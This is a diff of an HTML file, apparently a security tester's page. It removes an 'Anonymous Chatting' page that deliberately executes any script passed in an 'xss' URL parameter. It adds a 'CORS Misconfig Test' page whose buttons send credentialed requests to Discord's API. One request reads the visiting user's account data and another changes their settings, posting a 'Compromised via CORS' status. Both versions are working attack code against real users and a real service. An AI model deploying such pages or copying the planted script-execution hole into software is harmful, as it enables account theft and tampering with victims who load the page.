@@ -1,42 +1,54 @@
-
-
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="description" content="Anonymous chatting application for secure communication" />
-    <meta name="keywords" content="anonymous chat, secure messaging, privacy" />
-    <meta name="author" content="Anonymous" />
-    <meta name="robots" content="noindex, nofollow" />
-    <title>Anonymous Chatting</title>
-  </head>
-  <body>
-    <div id="root"></div>
-    <!-- XSS testing code for controlled environment -->
-    <script>
-      // Extract query parameter from URL
-      const urlParams = new URLSearchParams(window.location.search);
-      const payload = urlParams.get('xss');
+<html>
+<head>
+  <title>CORS Misconfig Test</title>
+</head>
+<body>
+  <h1>Testing CORS Misconfiguration on Discord</h1>
+  <button onclick="testRead()">Test Read Endpoint</button>
+  <button onclick="testWrite()">Test Write Endpoint</button>
 
-      // If a payload exists, execute it (for testing purposes only)
-      if (payload) {
-        try {
-          // Create a script element dynamically to execute the payload
-          const script = document.createElement('script');
-          script.text = payload;
-          document.body.appendChild(script);
-          // Example: URL with ?xss=alert('XSS from shared link!')
-          // Alternative: Display payload in DOM for visibility
-          document.getElementById("root").innerHTML = '<h1>XSS Payload Executed</h1>';
-        } catch (e) {
-          console.error("Error executing payload:", e);
-          document.getElementById("root").innerHTML = '<h1>Error: Invalid XSS Payload</h1>';
-        }
-      } else {
-        // Default content if no payload is provided
-        document.getElementById("root").innerHTML = "<h1>Welcome to Anonymous Chatting</h1>";
+  <pre id="output" style="white-space: pre-wrap;"></pre>
+
+  <script>
+    function log(text) {
+      document.getElementById("output").textContent += text + "\n";
+    }
+
+    async function testRead() {
+      try {
+        const res = await fetch("https://discord.com/api/v9/users/@me", {
+          method: "GET",
+          credentials: "include"
+        });
+        const text = await res.text();
+        log("READ Response:\n" + text);
+      } catch (err) {
+        log("Error in READ: " + err);
       }
-    </script>
-  </body>
+    }
+
+    async function testWrite() {
+      try {
+        const res = await fetch("https://discord.com/api/v9/users/@me/settings", {
+          method: "PATCH",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            theme: "light",
+            custom_status: {
+              text: "Compromised via CORS 🧨"
+            }
+          })
+        });
+        const text = await res.text();
+        log("WRITE Response:\n" + text);
+      } catch (err) {
+        log("Error in WRITE: " + err);
+      }
+    }
+  </script>
+</body>
 </html>
